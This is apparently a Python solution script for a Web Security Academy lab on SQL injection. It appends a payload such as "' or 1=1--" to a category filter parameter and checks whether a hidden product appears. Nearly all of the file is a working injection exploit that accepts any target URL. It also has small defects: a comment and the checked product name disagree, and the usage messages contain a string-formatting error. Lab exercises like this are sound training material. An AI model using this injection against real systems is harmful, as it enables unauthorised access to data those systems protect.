# Example usage 
# python3 1_SQL_show_hidden_products/code.py https://0a0800cd04c5f91b80de497a00310096.web-security-academy.net "' or 1=1--"

import requests
import sys
import urllib3


# Add proxies for debugging
proxies = {'http': 'http://127.0.0.1:8000','https': 'http://127.0.0.1:8000'}

def exploit_sqli(url,payload):
    # Disable SSL warnings
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Define the URL
    url = url + "/filter?category=" + payload
    
    r = requests.get(url, verify=False)
    
    # Check if the response has the hidden product "Cat Grin"
    if "Tea Bags" in r.text:
        return True
    else:
        return False


if __name__ == '__main__':
    # Extract params 
    try:
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
        
    # Show how to use in command line of parameters are not provided 
    except IndexError: 
        print("👉 Usage: <url> <payload>" %sys.argv[0])
        print("👉 Example: https://example.com '1==1'" %sys.argv[0])
        sys.exit(1)
    
    if exploit_sqli(url,payload):
        print("✅ SQL Injection was successful!")
    else:
        print("❌ SQL Injection was not successful!")
    
    